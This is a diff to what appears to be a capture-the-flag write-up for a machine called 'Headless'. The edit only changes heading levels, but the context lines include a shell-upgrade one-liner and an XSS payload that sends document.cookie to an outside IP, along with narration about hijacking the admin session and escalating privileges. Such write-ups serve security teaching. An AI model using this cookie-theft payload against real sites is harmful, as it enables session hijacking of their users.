@@ -4,7 +4,7 @@ description: python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 # Headless
 
-## Site enumeration
+# Site enumeration
 
 On the site there is only a countdown but using ffuf we find a dashboard directory with a submit form feature lets try command injection.
 
@@ -20,7 +20,7 @@ new Image().src='http://10.10.16.5/index?c='+document.cookie
 
 And now we have the admins cookie and can access the dashboard as admin!!
 
-## Priv esc
+# Priv esc
 
 If we play around we can get command execution on the box using this setup...
 
